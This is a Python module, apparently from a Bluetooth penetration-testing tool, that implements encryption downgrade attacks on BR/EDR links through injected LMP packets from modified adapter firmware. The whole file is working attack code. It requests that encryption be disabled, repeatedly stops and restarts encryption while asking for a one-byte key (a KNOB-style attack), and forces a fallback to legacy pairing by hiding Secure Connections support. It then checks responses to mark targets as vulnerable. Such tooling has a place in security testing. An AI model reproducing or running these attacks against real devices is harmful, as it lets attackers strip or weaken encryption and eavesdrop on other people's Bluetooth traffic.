"""Encryption downgrade attacks beyond KNOB.

Implements alternative encryption downgrade paths that exploit different
code paths than key-size reduction:
  - Encryption mode downgrade (disable encryption entirely)
  - Stop/start toggle (force re-negotiation with weaker params)
  - Legacy mode enforcement (reject SC, force LSC)

All control PDUs fit within the 10-byte DarkFirmware send buffer.

Prerequisites:
  - DarkFirmware loaded on RTL8761B adapter
  - Active ACL connection to target

Attack vectors:
  1. disable_encryption: LMP_ENCRYPTION_MODE_REQ(mode=0) — request no encryption
  2. toggle_encryption: Alternating STOP/START to force weaker re-negotiation
  3. force_legacy: Reject Secure Connections PDUs during re-keying to force
     Legacy Secure Connections (LSC) with weaker key derivation

References:
  - CVE-2019-9506 (KNOB) — key size reduction (complementary attack)
  - CVE-2023-24023 (BLUFFS) — session key diversification downgrade
  - BT Core Spec Vol 2, Part C, Section 4.6 (Encryption)
"""

from __future__ import annotations

import time

from blue_tap.utils.bt_helpers import normalize_mac
from blue_tap.utils.output import error, info, success, warning


class EncryptionDowngradeAttack:
    """Orchestrates encryption downgrade attacks via DarkFirmware LMP injection.

    Each attack method sends specific LMP PDU sequences designed to weaken
    or disable encryption on an active Bluetooth BR/EDR link.

    Args:
        target: Target Bluetooth address.
        hci: HCI adapter with DarkFirmware loaded (default ``"hci0"``).
    """

    def __init__(self, target: str, hci: str = "hci0") -> None:
        self.target = normalize_mac(target)
        self.hci = hci
        self._hci_idx = int(hci.replace("hci", "")) if hci.startswith("hci") else 0
        self._darkfirmware_available: bool | None = None

    def _check_darkfirmware(self) -> bool:
        """Verify DarkFirmware is loaded and ready for LMP injection."""
        if self._darkfirmware_available is not None:
            return self._darkfirmware_available

        try:
            from blue_tap.core.firmware import DarkFirmwareManager
            fw = DarkFirmwareManager()
            self._darkfirmware_available = fw.is_darkfirmware_loaded(self.hci)
        except Exception:
            self._darkfirmware_available = False

        return self._darkfirmware_available

    def _send_lmp_sequence(
        self,
        packets: list[bytes],
        labels: list[str],
        inter_packet_delay: float = 0.5,
        monitor_duration: float = 3.0,
    ) -> dict:
        """Send a sequence of LMP packets and collect responses.

        Args:
            packets: List of raw LMP PDU bytes to send.
            labels: Human-readable label for each packet.
            inter_packet_delay: Seconds between packets.
            monitor_duration: Seconds to monitor after last packet.

        Returns:
            Dict with ``"sent"``, ``"responses"``, ``"success"`` keys.
        """
        from blue_tap.core.hci_vsc import HCIVSCSocket

        result: dict = {
            "sent": [],
            "responses": [],
            "success": False,
        }

        try:
            lmp_responses: list[bytes] = []
            with HCIVSCSocket(self._hci_idx) as vsc:
                vsc.start_lmp_monitor(lambda evt: lmp_responses.append(evt))

                for pkt, label in zip(packets, labels):
                    info(f"Sending {label} ({len(pkt)} bytes: {pkt.hex()})")
                    ok = vsc.send_lmp(pkt)
                    result["sent"].append({
                        "label": label,
                        "data": pkt.hex(),
                        "ok": ok,
                    })
                    if not ok:
                        warning(f"Failed to send {label}")
                    if inter_packet_delay > 0:
                        time.sleep(inter_packet_delay)

                # Wait for responses
                info(f"Monitoring LMP responses for {monitor_duration}s...")
                time.sleep(monitor_duration)
                vsc.stop_lmp_monitor()

            result["responses"] = [
                r.get("payload", b"").hex() if isinstance(r, dict) else r.hex() if isinstance(r, bytes) else str(r)
                for r in lmp_responses
            ]
            result["success"] = len(result["sent"]) > 0
            info(f"Received {len(lmp_responses)} LMP response(s)")

        except Exception as exc:
            error(f"LMP sequence failed: {exc}")
            result["error"] = str(exc)

        return result

    def disable_encryption(self) -> dict:
        """Send LMP_ENCRYPTION_MODE_REQ(mode=0) to request no encryption.

        This directly asks the remote link manager to disable encryption
        on the ACL link. Compliant implementations should reject this if
        encryption is mandated by the host, but some firmware versions
        honour the request without host confirmation.

        Returns:
            Dict with attack results including sent packets and responses.
        """
        from blue_tap.fuzz.protocols.lmp import build_encryption_mode_req

        info("=== Encryption Downgrade: Disable Encryption ===")
        info(f"Target: {self.target}, Adapter: {self.hci}")

        if not self._check_darkfirmware():
            error("DarkFirmware not available — cannot inject LMP PDUs")
            return {"success": False, "error": "darkfirmware_unavailable"}

        info("Sending LMP_ENCRYPTION_MODE_REQ(mode=0) to disable encryption")
        packets = [build_encryption_mode_req(mode=0)]
        labels = ["LMP_ENCRYPTION_MODE_REQ(mode=0)"]

        result = self._send_lmp_sequence(packets, labels)
        result["method"] = "disable_encryption"

        if result["responses"]:
            # Check for LMP_ACCEPTED (opcode 3) or LMP_NOT_ACCEPTED (opcode 4)
            for resp_hex in result["responses"]:
                if not resp_hex:
                    continue
                resp = bytes.fromhex(resp_hex)
                if not resp:
                    continue
                if (resp[0] & 0x7F) == 3:  # LMP_ACCEPTED
                    success("Target ACCEPTED encryption disable request")
                    result["vulnerable"] = True
                elif resp and (resp[0] & 0x7F) == 4:  # LMP_NOT_ACCEPTED
                    info("Target rejected encryption disable (expected for compliant stacks)")
                    result["vulnerable"] = False
        else:
            warning("No response received — target may have dropped the link")

        return result

    def toggle_encryption(self, rounds: int = 5) -> dict:
        """Alternating LMP_STOP/START to force weaker re-negotiation.

        Each stop/start cycle forces the link manager to re-derive the
        encryption key. If the target's key derivation has insufficient
        entropy or reuses nonces, this can weaken the effective encryption.

        Args:
            rounds: Number of stop/start cycles (default 5).

        Returns:
            Dict with attack results.
        """
        from blue_tap.fuzz.protocols.lmp import (
            build_start_encryption_req,
            build_stop_encryption_req,
            build_enc_key_size_req,
        )

        info("=== Encryption Downgrade: Toggle Encryption ===")
        info(f"Target: {self.target}, Rounds: {rounds}")

        if not self._check_darkfirmware():
            error("DarkFirmware not available — cannot inject LMP PDUs")
            return {"success": False, "error": "darkfirmware_unavailable"}

        packets: list[bytes] = []
        labels: list[str] = []

        for i in range(rounds):
            packets.append(build_stop_encryption_req())
            labels.append(f"LMP_STOP_ENCRYPTION_REQ (round {i + 1})")
            packets.append(build_enc_key_size_req(key_size=1))
            labels.append(f"LMP_ENC_KEY_SIZE_REQ(size=1) (round {i + 1})")
            packets.append(build_start_encryption_req())
            labels.append(f"LMP_START_ENCRYPTION_REQ (round {i + 1})")

        info(f"Sending {len(packets)} LMP PDUs ({rounds} stop/negotiate/start cycles)")
        result = self._send_lmp_sequence(
            packets, labels,
            inter_packet_delay=0.3,
            monitor_duration=5.0,
        )
        result["method"] = "toggle_encryption"
        result["rounds"] = rounds

        # Analyze responses for accepted key size=1
        accepted_count = 0
        rejected_count = 0
        for resp_hex in result.get("responses", []):
            if not resp_hex:
                continue
            resp = bytes.fromhex(resp_hex)
            if not resp:
                continue
            if (resp[0] & 0x7F) == 3:
                accepted_count += 1
            elif resp and (resp[0] & 0x7F) == 4:
                rejected_count += 1

        result["accepted_count"] = accepted_count
        result["rejected_count"] = rejected_count
        if accepted_count > 0:
            success(f"Target accepted {accepted_count} PDU(s) during toggle sequence")
        info(f"Toggle results: {accepted_count} accepted, {rejected_count} rejected")

        return result

    def force_legacy(self) -> dict:
        """Send LMP_NOT_ACCEPTED to SC PDUs during re-keying.

        Forces the target to fall back to Legacy Secure Connections (LSC)
        by rejecting any Secure Connections related PDUs. LSC uses weaker
        key derivation that is susceptible to BLUFFS-style attacks.

        Returns:
            Dict with attack results.
        """
        from blue_tap.fuzz.protocols.lmp import (
            LMP_ESCAPE_4,
            build_ext_not_accepted,
            build_features_res,
            build_not_accepted,
            build_au_rand,
            build_enc_key_size_req,
            EXT_IO_CAPABILITY_REQ,
            ERROR_UNSUPPORTED_PARAMETER,
        )

        info("=== Encryption Downgrade: Force Legacy (Reject SC) ===")
        info(f"Target: {self.target}")

        if not self._check_darkfirmware():
            error("DarkFirmware not available — cannot inject LMP PDUs")
            return {"success": False, "error": "darkfirmware_unavailable"}

        # Feature mask with Secure Connections bit cleared
        # BT Core Spec Vol 2, Part C, Section 3.3: SC host support is bit 3 of byte 7
        # SC controller support is bit 2 of byte 5
        no_sc_features = b"\xbf\xfe\x8f\xfe\xd8\x3b\x5b\x87"  # SC bits cleared

        packets = [
            # 1. Advertise features WITHOUT Secure Connections
            build_features_res(features=no_sc_features),
            # 2. Reject IO_CAPABILITY_REQ (SC pairing initiation)
            build_ext_not_accepted(
                LMP_ESCAPE_4,
                EXT_IO_CAPABILITY_REQ,
                ERROR_UNSUPPORTED_PARAMETER,
            ),
            # 3. Initiate legacy authentication
            build_au_rand(),
            # 4. Request minimum key size (KNOB combo)
            build_enc_key_size_req(key_size=1),
        ]
        labels = [
            "LMP_FEATURES_RES (SC bits cleared)",
            "LMP_NOT_ACCEPTED_EXT(IO_CAPABILITY_REQ) — reject SC",
            "LMP_AU_RAND (force legacy auth)",
            "LMP_ENC_KEY_SIZE_REQ(size=1) (KNOB combo)",
        ]

        info("Sending legacy enforcement sequence (4 PDUs)")
        result = self._send_lmp_sequence(
            packets, labels,
            inter_packet_delay=0.5,
            monitor_duration=5.0,
        )
        result["method"] = "force_legacy"

        if result["responses"]:
            success(f"Received {len(result['responses'])} response(s) to legacy enforcement")
        else:
            warning("No responses — target may have dropped the link or ignored PDUs")

        return result

    def execute(self, method: str = "all") -> dict:
        """Run all or specific downgrade attack methods.

        Args:
            method: Attack method to execute. One of ``"disable"``,
                ``"toggle"``, ``"legacy"``, or ``"all"`` (default).

        Returns:
            Dict with results from each executed method.
        """
        # Map new CLI names to internal names
        _name_map = {
            "no-encryption": "disable",
            "force-renegotiation": "toggle",
            "reject-secure-connections": "legacy",
        }
        method = _name_map.get(method, method)

        info(f"=== Encryption Downgrade Attack: method={method} ===")
        info(f"Target: {self.target}, Adapter: {self.hci}")

        if not self._check_darkfirmware():
            error("DarkFirmware not available — encryption downgrade requires LMP injection")
            return {"success": False, "error": "darkfirmware_unavailable"}

        results: dict = {"target": self.target, "methods": {}}

        if method in ("disable", "all"):
            info("--- Method 1: Disable Encryption ---")
            results["methods"]["disable"] = self.disable_encryption()

        if method in ("toggle", "all"):
            info("--- Method 2: Toggle Encryption ---")
            results["methods"]["toggle"] = self.toggle_encryption()

        if method in ("legacy", "all"):
            info("--- Method 3: Force Legacy ---")
            results["methods"]["legacy"] = self.force_legacy()

        # Summary
        vulnerable_methods = [
            m for m, r in results["methods"].items()
            if r.get("vulnerable") or r.get("accepted_count", 0) > 0
        ]
        results["vulnerable_methods"] = vulnerable_methods
        results["success"] = True

        if vulnerable_methods:
            success(f"Encryption downgrade succeeded via: {', '.join(vulnerable_methods)}")
        else:
            info("No encryption downgrade methods succeeded against this target")

        return results
